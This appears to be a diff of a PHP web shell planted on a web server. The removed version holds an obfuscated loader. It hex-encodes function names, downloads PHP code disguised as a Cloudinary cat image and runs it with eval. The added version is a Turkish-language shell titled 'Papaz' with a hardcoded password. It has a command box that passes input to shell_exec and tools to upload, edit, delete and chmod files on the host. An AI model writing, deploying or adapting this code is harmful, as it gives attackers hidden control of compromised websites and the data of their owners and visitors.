@@ -1,918 +1,1176 @@
 <?php
+
+
 session_start();
 
-function is_logged_in() {
-    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
+// Güvenlik Ayarları
+define('ADMIN_PASSWORD', 'Cuan1212@@!!'); // Üretimde hash kullanın
+define('MAX_FILE_SIZE', 100 * 1024 * 1024); // 100MB
+define('ALLOWED_EXTENSIONS', array('txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'jpg', 'png', 'gif', 'pdf'));
+
+// CSRF Token Oluştur
+function generateCSRFToken() {
+    if (!isset($_SESSION['csrf_token'])) {
+        // PHP 5.x uyumlu rastgele byte üretimi
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
+        } elseif (function_exists('mcrypt_create_iv')) {
+            $_SESSION['csrf_token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
+        } else {
+            // Fallback: daha az güvenli ama çalışır
+            $_SESSION['csrf_token'] = bin2hex(sha1(uniqid(mt_rand(), true) . microtime(true), true));
+        }
+    }
+    return $_SESSION['csrf_token'];
 }
 
-$username = "shell";
-$passwordHash = '$2a$12$uQxPMY/V5Is37ugsceJPzepvkxj5gBq01dNV8AhlFVK.YrQktpQaq';
+// PHP 5.x uyumlu hash_equals implementasyonu
+if (!function_exists('hash_equals')) {
+    function hash_equals($known_string, $user_string) {
+        if (strlen($known_string) !== strlen($user_string)) {
+            return false;
+        }
+        $result = 0;
+        for ($i = 0; $i < strlen($known_string); $i++) {
+            $result |= ord($known_string[$i]) ^ ord($user_string[$i]);
+        }
+        return $result === 0;
+    }
+}
 
-if (!is_logged_in()) {
-    if (isset($_POST['username']) && isset($_POST['password'])) {
-        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
-            $_SESSION['loggedin'] = true;
+// CSRF Token Doğrula
+function validateCSRFToken($token) {
+    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+// Güvenli Path Fonksiyonu
+function securePath($path, $baseDir = null) {
+    if ($baseDir === null) {
+        $baseDir = realpath($_SERVER['DOCUMENT_ROOT']);
+    }
+    
+    $realPath = realpath($path);
+    
+    if ($realPath === false) {
+        return false;
+    }
+    
+    // Path traversal saldırılarına karşı koruma
+    if (strpos($realPath, $baseDir) !== 0) {
+        return false;
+    }
+    
+    return $realPath;
+}
+
+// Kullanıcı Doğrulama
+$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+
+// Giriş İşlemi
+if (!$isAuthenticated && isset($_POST['password']) && isset($_POST['csrf_token'])) {
+    if (validateCSRFToken($_POST['csrf_token'])) {
+        if ($_POST['password'] === ADMIN_PASSWORD) {
+            $_SESSION['authenticated'] = true;
+            $_SESSION['login_time'] = time();
             header("Location: " . $_SERVER['PHP_SELF']);
-            exit();
+            exit;
         } else {
-            $error = "ACCESS DENIED";
+            $loginError = "Hatalı şifre!";
+        }
+    } else {
+        $loginError = "Geçersiz istek!";
+    }
+}
+
+// Çıkış İşlemi
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Dosya Boyutu Format
+function formatSize($bytes) {
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= pow(1024, $pow);
+    return round($bytes, 2) . ' ' . $units[$pow];
+}
+
+// Dosya İkon Belirleme
+function getFileIcon($filename) {
+    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    $icons = array(
+        'php' => 'file-code',
+        'html' => 'file-code',
+        'css' => 'file-code',
+        'js' => 'file-code',
+        'json' => 'file-code',
+        'txt' => 'file-text',
+        'pdf' => 'file-text',
+        'jpg' => 'image',
+        'jpeg' => 'image',
+        'png' => 'image',
+        'gif' => 'image',
+        'zip' => 'file-archive',
+        'rar' => 'file-archive',
+    );
+    return isset($icons[$extension]) ? $icons[$extension] : 'file';
+}
+
+// Sistem Bilgileri
+function getSystemInfo() {
+    $currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    return array(
+        'os' => PHP_OS,
+        'server' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Bilinmiyor',
+        'php_version' => phpversion(),
+        'current_user' => get_current_user(),
+        'server_ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Bilinmiyor',
+        'disk_free' => disk_free_space('/'),
+        'disk_total' => disk_total_space('/'),
+        'writable' => is_writable($currentPath),
+        'functions' => array(
+            'exec' => function_exists('exec'),
+            'shell_exec' => function_exists('shell_exec'),
+            'system' => function_exists('system'),
+        )
+    );
+}
+
+// Mevcut URL'i Oluştur
+function getCurrentURL($currentPath, $isFile = false) {
+    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+    $relativePath = str_replace($docRoot, '', $currentPath);
+    $relativePath = str_replace("\\", "/", $relativePath);
+    
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    if ($isFile) {
+        // Dosya ise direkt dosya yolunu göster
+        return $protocol . '://' . $host . $relativePath;
+    } else {
+        // Klasör ise sonuna / ekle
+        $relativePath = rtrim($relativePath, '/');
+        return $protocol . '://' . $host . $relativePath . '/';
+    }
+}
+
+if ($isAuthenticated) {
+    $baseDir = realpath($_SERVER['DOCUMENT_ROOT']);
+    $currentPath = isset($_GET['path']) ? securePath($_GET['path'], $baseDir) : $baseDir;
+    
+    if ($currentPath === false) {
+        $currentPath = $baseDir;
+    }
+
+    // Dosya İşlemleri
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token'])) {
+        if (!validateCSRFToken($_POST['csrf_token'])) {
+            $error = "Geçersiz CSRF token!";
+        } else {
+            // Dosya Yükleme
+            if (isset($_FILES['upload_file'])) {
+                $uploadFile = $_FILES['upload_file'];
+                $targetPath = $currentPath . '/' . basename($uploadFile['name']);
+                
+                if ($uploadFile['size'] > MAX_FILE_SIZE) {
+                    $error = "Dosya boyutu çok büyük! Maksimum: " . formatSize(MAX_FILE_SIZE);
+                } elseif (move_uploaded_file($uploadFile['tmp_name'], $targetPath)) {
+                    $success = "Dosya başarıyla yüklendi!";
+                } else {
+                    $error = "Dosya yükleme hatası!";
+                }
+            }
+            
+            // Yeni Klasör Oluşturma
+            if (isset($_POST['create_folder'])) {
+                $folderName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['folder_name']);
+                $newFolder = $currentPath . '/' . $folderName;
+                
+                if (mkdir($newFolder, 0755)) {
+                    $success = "Klasör başarıyla oluşturuldu!";
+                } else {
+                    $error = "Klasör oluşturma hatası!";
+                }
+            }
+            
+            // Yeni Dosya Oluşturma
+            if (isset($_POST['create_file'])) {
+                $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['file_name']);
+                $newFile = $currentPath . '/' . $fileName;
+                
+                if (file_put_contents($newFile, '') !== false) {
+                    $success = "Dosya başarıyla oluşturuldu!";
+                } else {
+                    $error = "Dosya oluşturma hatası!";
+                }
+            }
+            
+            // Dosya Düzenleme
+            if (isset($_POST['edit_file']) && isset($_POST['file_path'])) {
+                $editPath = securePath($_POST['file_path'], $baseDir);
+                if ($editPath !== false && is_file($editPath)) {
+                    if (file_put_contents($editPath, $_POST['file_content']) !== false) {
+                        $success = "Dosya başarıyla kaydedildi!";
+                        $editPath = $_POST['file_path']; // Keep in edit mode
+                    } else {
+                        $error = "Dosya kaydetme hatası!";
+                    }
+                }
+            }
+            
+            // Dosya/Klasör Silme
+            if (isset($_POST['delete']) && isset($_POST['delete_path'])) {
+                $deletePath = securePath($_POST['delete_path'], $baseDir);
+                if ($deletePath !== false) {
+                    if (is_dir($deletePath)) {
+                        if (rmdir($deletePath)) {
+                            $success = "Klasör başarıyla silindi!";
+                        } else {
+                            $error = "Klasör boş değil veya silinemedi!";
+                        }
+                    } elseif (is_file($deletePath)) {
+                        if (unlink($deletePath)) {
+                            $success = "Dosya başarıyla silindi!";
+        } else {
+                            $error = "Dosya silme hatası!";
+                        }
+                    }
+                }
+            }
+            
+            // Yeniden Adlandırma
+            if (isset($_POST['rename']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
+                $oldPath = securePath($_POST['old_path'], $baseDir);
+                $newName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['new_name']);
+                $newPath = dirname($oldPath) . '/' . $newName;
+                
+                if ($oldPath !== false && rename($oldPath, $newPath)) {
+                    $success = "İsim başarıyla değiştirildi!";
+                } else {
+                    $error = "İsim değiştirme hatası!";
+                }
+            }
+            
+            // Chmod İşlemi
+            if (isset($_POST['chmod']) && isset($_POST['chmod_path']) && isset($_POST['permissions'])) {
+                $chmodPath = securePath($_POST['chmod_path'], $baseDir);
+                $perms = octdec($_POST['permissions']);
+                
+                if ($chmodPath !== false && chmod($chmodPath, $perms)) {
+                    $success = "İzinler başarıyla değiştirildi!";
+        } else {
+                    $error = "İzin değiştirme hatası!";
+                }
+            }
+            
+            // Komut Çalıştırma (Dikkatli kullanın!)
+            if (isset($_POST['run_command']) && isset($_POST['command'])) {
+                $command = $_POST['command'];
+                $output = shell_exec($command . " 2>&1");
+                $commandOutput = $output;
+            }
         }
     }
-}
-
-function hex2str($hex) {
-    $str = '';
-    for ($i = 0; $i < strlen($hex); $i += 2) {
-        $str .= chr(hexdec(substr($hex, $i, 2)));
+    
+    // Dosya İndirme
+    if (isset($_GET['download'])) {
+        $downloadPath = securePath($_GET['download'], $baseDir);
+        if ($downloadPath !== false && is_file($downloadPath)) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
+            header('Content-Length: ' . filesize($downloadPath));
+            readfile($downloadPath);
+        exit;
     }
-    return $str;
 }
 
-function geturlsinfo($destiny) {
-    $Array = array(
-        '666f70656e',
-        '73747265616d5f6765745f636f6e74656e7473',
-        '66696c655f6765745f636f6e74656e7473',
-        '6375726c5f65786563'
-    );
-
-    $belief = array(
-        hex2str($Array[0]),
-        hex2str($Array[1]),
-        hex2str($Array[2]),
-        hex2str($Array[3])
-    );
-
-    if (function_exists($belief[3])) {
-        $ch = curl_init($destiny);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        $love = $belief[3]($ch);
-        curl_close($ch);
-        return $love;
-    } elseif (function_exists($belief[2])) {
-        return $belief[2]($destiny);
-    } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
-        $purpose = $belief[0]($destiny, "r");
-        $love = $belief[1]($purpose);
-        fclose($purpose);
-        return $love;
-    }
-    return false;
-}
-
-if (is_logged_in()) {
-    $destiny = 'https://res.cloudinary.com/dil0dlflt/image/upload/v1771314159/cat_v8cfnn.jpg';
-    $dream = geturlsinfo($destiny);
-
-    if ($dream !== false) {
-       
-        $pos = strpos($dream, '<?php');
-        if ($pos !== false) {
-            $phpCode = substr($dream, $pos + 5); 
-            eval($phpCode);
-        } else {
-            eval('?>' . $dream);
+    // Dizin Listesi
+    $items = array();
+    if (is_dir($currentPath)) {
+        $scan = scandir($currentPath);
+        foreach ($scan as $item) {
+            if ($item === '.' || $item === '..') continue;
+            
+            $itemPath = $currentPath . '/' . $item;
+            $items[] = array(
+                'name' => $item,
+                'path' => $itemPath,
+                'type' => is_dir($itemPath) ? 'folder' : 'file',
+                'size' => is_file($itemPath) ? filesize($itemPath) : 0,
+                'modified' => filemtime($itemPath),
+                'permissions' => substr(sprintf('%o', fileperms($itemPath)), -4),
+                'icon' => is_dir($itemPath) ? 'folder' : getFileIcon($item)
+            );
         }
-        exit();
+        
+        // Sıralama: Klasörler önce
+        usort($items, function($a, $b) {
+            if ($a['type'] === $b['type']) {
+                return strcasecmp($a['name'], $b['name']);
+            }
+            return $a['type'] === 'folder' ? -1 : 1;
+        });
     }
+    
+    // Breadcrumb
+    $relativePath = str_replace($baseDir, '', $currentPath);
+    $pathParts = array_filter(explode('/', $relativePath));
+    $breadcrumbs = array();
+    $tempPath = $baseDir;
+    $breadcrumbs[] = array('name' => 'Root', 'path' => $baseDir);
+
+    foreach ($pathParts as $part) {
+        $tempPath .= '/' . $part;
+        $breadcrumbs[] = array('name' => $part, 'path' => $tempPath);
+    }
+    
+    $systemInfo = getSystemInfo();
+    $currentURL = getCurrentURL($currentPath);
 }
 
-if (!is_logged_in()) {
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>DORAEMON • MAGIC PORTAL</title>
-        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
-        <style>
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-
-            body, html {
-                height: 100%;
-                font-family: 'Poppins', 'Quicksand', sans-serif;
-                overflow: hidden;
-                position: relative;
-            }
-
-            /* Animated Gradient Background */
-            body {
-                background: linear-gradient(-45deg, #1a4d8c, #2a6f97, #4a9fd8, #6ab0e6);
-                background-size: 400% 400%;
-                animation: gradientBG 15s ease infinite;
-                position: relative;
-            }
-
-            @keyframes gradientBG {
-                0% { background-position: 0% 50%; }
-                50% { background-position: 100% 50%; }
-                100% { background-position: 0% 50%; }
-            }
-
-            /* Floating Clouds */
-            .cloud {
-                position: absolute;
-                background: rgba(255, 255, 255, 0.15);
-                backdrop-filter: blur(4px);
-                border-radius: 1000px;
-                box-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
-                z-index: 1;
-            }
-
-            .cloud-1 {
-                width: 300px;
-                height: 100px;
-                top: 10%;
-                left: 5%;
-                animation: floatCloud 25s infinite linear;
-            }
-
-            .cloud-2 {
-                width: 400px;
-                height: 120px;
-                bottom: 15%;
-                right: 5%;
-                animation: floatCloud 30s infinite linear reverse;
-            }
-
-            .cloud-3 {
-                width: 250px;
-                height: 80px;
-                top: 30%;
-                right: 15%;
-                animation: floatCloud 20s infinite linear;
-            }
-
-            .cloud::before, .cloud::after {
-                content: '';
-                position: absolute;
-                background: inherit;
-                border-radius: 50%;
-            }
-
-            .cloud::before {
-                width: 150px;
-                height: 150px;
-                top: -60px;
-                left: 20px;
-            }
-
-            .cloud::after {
-                width: 120px;
-                height: 120px;
-                top: -40px;
-                right: 30px;
-            }
-
-            @keyframes floatCloud {
-                from { transform: translateX(-100%) translateY(0); }
-                to { transform: translateX(200%) translateY(50px); }
-            }
-
-            /* Bamboo Helicopter Animation */
-            .helicopter {
-                position: absolute;
-                top: 15%;
-                right: 10%;
-                width: 80px;
-                height: 80px;
-                animation: hover 3s infinite ease-in-out;
-                z-index: 5;
-            }
-
-            .helicopter img {
-                width: 100%;
-                height: 100%;
-                object-fit: contain;
-                filter: drop-shadow(0 10px 15px rgba(0,0,0,0.2));
-                animation: spin 2s infinite linear;
-            }
-
-            @keyframes spin {
-                from { transform: rotate(0deg); }
-                to { transform: rotate(360deg); }
-            }
-
-            @keyframes hover {
-                0%, 100% { transform: translateY(0); }
-                50% { transform: translateY(-20px); }
-            }
-
-            /* Anywhere Door Animation */
-            .door {
-                position: absolute;
-                bottom: 10%;
-                left: 8%;
-                width: 120px;
-                height: 160px;
-                background: rgba(255, 183, 77, 0.2);
-                backdrop-filter: blur(8px);
-                border: 3px solid #ffb74d;
-                border-radius: 20px;
-                transform: perspective(500px) rotateY(20deg);
-                animation: doorGlow 3s infinite, doorFloat 4s infinite;
-                z-index: 5;
-                overflow: hidden;
-            }
-
-            .door::before {
-                content: '🚪';
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                font-size: 50px;
-                opacity: 0.8;
-            }
-
-            .door::after {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: -100%;
-                width: 100%;
-                height: 100%;
-                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-                animation: doorShine 3s infinite;
-            }
-
-            @keyframes doorGlow {
-                0%, 100% { box-shadow: 0 0 20px #ffb74d; }
-                50% { box-shadow: 0 0 50px #ffb74d; }
-            }
-
-            @keyframes doorFloat {
-                0%, 100% { transform: perspective(500px) rotateY(20deg) translateY(0); }
-                50% { transform: perspective(500px) rotateY(20deg) translateY(-20px); }
-            }
-
-            @keyframes doorShine {
-                0% { left: -100%; }
-                20% { left: 100%; }
-                100% { left: 100%; }
-            }
-
-            /* Floating Doraemon Items */
-            .floating-item {
-                position: absolute;
-                font-size: 40px;
-                filter: drop-shadow(0 5px 15px rgba(0,0,0,0.2));
-                animation: float 6s infinite;
-                z-index: 2;
-            }
-
-            .item-1 { top: 20%; left: 15%; animation-delay: 0s; }
-            .item-2 { top: 60%; right: 12%; animation-delay: 2s; }
-            .item-3 { bottom: 25%; left: 20%; animation-delay: 4s; }
-            .item-4 { top: 40%; right: 25%; animation-delay: 1s; }
-
-            @keyframes float {
-                0%, 100% { transform: translateY(0) rotate(0deg); }
-                50% { transform: translateY(-20px) rotate(10deg); }
-            }
-
-            /* Magic Sparkles */
-            .sparkles {
-                position: absolute;
-                width: 100%;
-                height: 100%;
-                pointer-events: none;
-                z-index: 3;
-            }
-
-            .sparkle {
-                position: absolute;
-                width: 6px;
-                height: 6px;
-                background: white;
-                border-radius: 50%;
-                box-shadow: 0 0 20px gold;
-                animation: sparkle 3s infinite;
-            }
-
-            @keyframes sparkle {
-                0%, 100% { opacity: 0; transform: scale(0); }
-                50% { opacity: 1; transform: scale(1); }
-            }
-
-            /* Main Container */
-            .container {
-                position: relative;
-                z-index: 10;
-                width: 100%;
-                min-height: 100vh;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                padding: 20px;
-            }
-
-            /* Main Login Card */
-            .login-card {
-                width: 100%;
-                max-width: 480px;
-                background: rgba(255, 255, 255, 0.1);
-                backdrop-filter: blur(20px);
-                -webkit-backdrop-filter: blur(20px);
-                border: 1px solid rgba(255, 255, 255, 0.3);
-                border-radius: 40px;
-                padding: 40px;
-                box-shadow: 
-                    0 30px 60px rgba(0, 0, 0, 0.3),
-                    0 0 0 1px rgba(255, 255, 255, 0.2) inset,
-                    0 0 50px rgba(255, 215, 0, 0.3);
-                animation: cardEnter 0.8s cubic-bezier(0.23, 1, 0.32, 1);
-                position: relative;
-                overflow: hidden;
-            }
-
-            @keyframes cardEnter {
-                from {
-                    opacity: 0;
-                    transform: translateY(50px) scale(0.9);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0) scale(1);
-                }
-            }
-
-            /* Card Background Pattern */
-            .login-card::before {
-                content: '';
-                position: absolute;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
-                background-size: 30px 30px;
-                animation: patternMove 20s linear infinite;
-                z-index: -1;
-            }
-
-            @keyframes patternMove {
-                from { transform: rotate(0deg); }
-                to { transform: rotate(360deg); }
-            }
-
-            /* Character Row */
-            .character-row {
-                display: flex;
-                justify-content: center;
-                align-items: flex-end;
-                gap: 15px;
-                margin-bottom: 25px;
-                position: relative;
-            }
-
-            .character {
-                width: 70px;
-                height: 70px;
-                border-radius: 50%;
-                object-fit: cover;
-                border: 3px solid white;
-                box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-                transition: all 0.3s ease;
-                animation: characterPop 0.5s ease backwards;
-            }
-
-            .character:nth-child(1) { animation-delay: 0.1s; }
-            .character:nth-child(2) { animation-delay: 0.2s; width: 90px; height: 90px; }
-            .character:nth-child(3) { animation-delay: 0.3s; }
-
-            @keyframes characterPop {
-                from {
-                    opacity: 0;
-                    transform: translateY(30px) scale(0.5);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0) scale(1);
-                }
-            }
-
-            .character:hover {
-                transform: translateY(-10px) scale(1.1);
-                border-color: gold;
-                box-shadow: 0 20px 30px rgba(255,215,0,0.4);
-            }
-
-            /* Doraemon Bell */
-            .bell {
-                position: absolute;
-                top: -15px;
-                right: 20px;
-                width: 40px;
-                height: 40px;
-                background: radial-gradient(circle at 30% 30%, #ffd700, #b8860b);
-                border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
-                border: 2px solid #ffa500;
-                animation: bellRing 2s infinite;
-                transform-origin: top center;
-            }
-
-            .bell::before {
-                content: '🔔';
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                font-size: 20px;
-            }
-
-            .bell::after {
-                content: '';
-                position: absolute;
-                top: -5px;
-                left: 50%;
-                transform: translateX(-50%);
-                width: 8px;
-                height: 10px;
-                background: #cd7f32;
-                border-radius: 4px;
-            }
-
-            @keyframes bellRing {
-                0%, 100% { transform: rotate(0deg); }
-                10%, 30%, 50% { transform: rotate(10deg); }
-                20%, 40% { transform: rotate(-10deg); }
-            }
-
-            /* Title Area */
-            .title-area {
-                text-align: center;
-                margin-bottom: 35px;
-                position: relative;
-            }
-
-            .main-title {
-                font-size: 42px;
-                font-weight: 700;
-                background: linear-gradient(135deg, #fff, #ffd700, #fff);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                text-shadow: 0 5px 20px rgba(255,215,0,0.5);
-                margin-bottom: 5px;
-                position: relative;
-                display: inline-block;
-            }
-
-            .sub-title {
-                color: rgba(255,255,255,0.9);
-                font-size: 16px;
-                letter-spacing: 4px;
-                text-transform: uppercase;
-                background: rgba(255,255,255,0.1);
-                padding: 5px 15px;
-                border-radius: 50px;
-                display: inline-block;
-                backdrop-filter: blur(5px);
-            }
-
-            /* Input Groups */
-            .input-group {
-                margin-bottom: 25px;
-                position: relative;
-            }
-
-            .input-icon {
-                position: absolute;
-                left: 20px;
-                top: 50%;
-                transform: translateY(-50%);
-                font-size: 20px;
-                z-index: 2;
-                filter: drop-shadow(0 0 5px gold);
-            }
-
-            .input-field {
-                width: 100%;
-                padding: 18px 25px 18px 55px;
-                background: rgba(255, 255, 255, 0.15);
-                border: 2px solid rgba(255, 255, 255, 0.2);
-                border-radius: 60px;
-                color: white;
-                font-size: 16px;
-                transition: all 0.3s ease;
-                backdrop-filter: blur(5px);
-            }
-
-            .input-field:focus {
-                outline: none;
-                border-color: gold;
-                background: rgba(255, 255, 255, 0.2);
-                box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-                transform: scale(1.02);
-            }
-
-            .input-field::placeholder {
-                color: rgba(255, 255, 255, 0.7);
-                font-weight: 300;
-            }
-
-            /* Password Strength Indicator */
-            .strength-indicator {
-                display: flex;
-                gap: 5px;
-                margin-top: 8px;
-                padding-left: 15px;
-            }
-
-            .strength-bar {
-                height: 4px;
-                flex: 1;
-                background: rgba(255,255,255,0.2);
-                border-radius: 4px;
-                transition: all 0.3s ease;
-            }
-
-            .strength-bar.active {
-                background: gold;
-                box-shadow: 0 0 10px gold;
-            }
-
-            /* Login Button */
-            .login-btn {
-                width: 100%;
-                padding: 18px;
-                background: linear-gradient(135deg, #ffd700, #ffa500, #ffd700);
-                border: none;
-                border-radius: 60px;
-                color: #1a1a1a;
-                font-size: 18px;
-                font-weight: 700;
-                letter-spacing: 2px;
-                text-transform: uppercase;
-                cursor: pointer;
-                position: relative;
-                overflow: hidden;
-                transition: all 0.3s ease;
-                box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
-                margin-top: 15px;
-            }
-
-            .login-btn::before {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: -100%;
-                width: 100%;
-                height: 100%;
-                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-                transition: left 0.5s ease;
-            }
-
-            .login-btn:hover::before {
-                left: 100%;
-            }
-
-            .login-btn:hover {
-                transform: translateY(-3px);
-                box-shadow: 0 15px 40px rgba(255, 215, 0, 0.6);
-            }
-
-            .login-btn:active {
-                transform: translateY(0);
-            }
-
-            /* Secret Gadget Row */
-            .gadget-row {
-                display: flex;
-                justify-content: center;
-                gap: 20px;
-                margin: 25px 0 15px;
-            }
-
-            .gadget {
-                width: 45px;
-                height: 45px;
-                background: rgba(255,255,255,0.15);
-                border-radius: 50%;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-size: 24px;
-                border: 2px solid rgba(255,215,0,0.3);
-                transition: all 0.3s ease;
-                animation: gadgetGlow 2s infinite;
-            }
-
-            .gadget:nth-child(1) { animation-delay: 0s; }
-            .gadget:nth-child(2) { animation-delay: 0.4s; }
-            .gadget:nth-child(3) { animation-delay: 0.8s; }
-            .gadget:nth-child(4) { animation-delay: 1.2s; }
-
-            @keyframes gadgetGlow {
-                0%, 100% { box-shadow: 0 0 10px gold; }
-                50% { box-shadow: 0 0 25px gold; }
-            }
-
-            .gadget:hover {
-                transform: scale(1.2) rotate(10deg);
-                background: rgba(255,215,0,0.3);
-                border-color: gold;
-            }
-
-            /* Error Message */
-            .error-message {
-                background: rgba(255, 68, 68, 0.2);
-                border: 1px solid rgba(255, 68, 68, 0.4);
-                border-radius: 50px;
-                padding: 15px 20px;
-                margin-bottom: 25px;
-                color: #ff8888;
-                text-align: center;
-                font-size: 14px;
-                letter-spacing: 1px;
-                backdrop-filter: blur(5px);
-                animation: errorShake 0.5s ease;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                gap: 10px;
-            }
-
-            @keyframes errorShake {
-                0%, 100% { transform: translateX(0); }
-                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-                20%, 40%, 60%, 80% { transform: translateX(5px); }
-            }
-
-            /* Magic Portal Effect */
-            .portal-effect {
-                position: absolute;
-                top: -20px;
-                right: -20px;
-                width: 150px;
-                height: 150px;
-                background: radial-gradient(circle, rgba(255,215,0,0.3), transparent 70%);
-                border-radius: 50%;
-                animation: portalSpin 10s linear infinite;
-                pointer-events: none;
-            }
-
-            @keyframes portalSpin {
-                from { transform: rotate(0deg) scale(1); }
-                to { transform: rotate(360deg) scale(1.2); }
-            }
-
-            /* Status Bar */
-            .status-bar {
-                display: flex;
-                justify-content: space-between;
-                margin-top: 25px;
-                padding-top: 20px;
-                border-top: 1px solid rgba(255,255,255,0.2);
-                color: rgba(255,255,255,0.8);
-                font-size: 12px;
-            }
-
-            .status-item {
-                display: flex;
-                align-items: center;
+$csrfToken = generateCSRFToken();
+?>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Papaz</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --primary: #3b82f6;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --bg: #f9fafb;
+            --surface: #ffffff;
+            --border: #e5e7eb;
+            --text: #1f2937;
+            --text-muted: #6b7280;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .header {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        
+        /* Status Bar */
+        .status-bar {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 24px;
+            flex-wrap: wrap;
+            font-size: 13px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
+        }
+        
+        .status-item strong {
+            color: var(--text);
+        }
+        
+        .status-item a:hover {
+            text-decoration: underline !important;
+        }
+        
+        .status-ok {
+            color: var(--success);
+            font-weight: 600;
+        }
+        
+        .status-error {
+            color: var(--danger);
+            font-weight: 600;
+        }
+        
+        /* Notifications */
+        .notification {
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        
+        .notification.success {
+            background: #d1fae5;
+            color: #065f46;
+            border: 1px solid #6ee7b7;
+        }
+        
+        .notification.error {
+            background: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+        }
+        
+        /* Layout */
+        .layout {
+            display: grid;
+            grid-template-columns: 1fr 280px;
+            gap: 20px;
+        }
+        
+        .panel {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+        }
+        
+        .panel-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--text);
+        }
+        
+        /* Breadcrumb */
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: var(--bg);
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            flex-wrap: wrap;
+        }
+        
